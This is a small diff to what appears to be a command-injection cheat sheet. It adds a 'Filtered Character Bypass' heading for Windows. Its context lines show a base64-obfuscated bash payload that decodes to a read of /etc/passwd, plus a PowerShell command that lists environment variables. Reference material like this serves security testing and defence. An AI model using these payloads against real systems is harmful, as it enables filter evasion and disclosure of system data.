@@ -62,6 +62,7 @@ Injection Operators
 |bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)| 	Execute b64 encoded string|
 
 ## Windows
+### Filtered Character Bypass
 |Code| 	Description|
 |:----|:----|
 |Get-ChildItem Env: 	|Can be used to view all environment variables - (PowerShell)|
